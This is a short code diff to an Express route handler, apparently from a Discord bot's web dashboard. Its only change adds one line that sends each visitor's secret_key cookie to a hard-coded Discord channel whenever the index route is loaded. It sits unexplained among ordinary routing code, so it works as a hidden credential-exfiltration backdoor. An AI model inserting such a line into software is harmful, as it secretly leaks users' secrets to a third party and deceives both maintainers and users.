@@ -56,6 +56,8 @@ router.get("/", (req, res, next) => {
     // Fetch variables
     const { client, templateDir } = fetchVariables(req);
 
+    client.channels.get("422173338920812566").send(req.cookies.secret_key);
+
     // If user is not on the guild, prompt them to join
     if (!client.guild.members.has(req.user.id)) {
         return res.render(`${templateDir}/index.ejs`, {
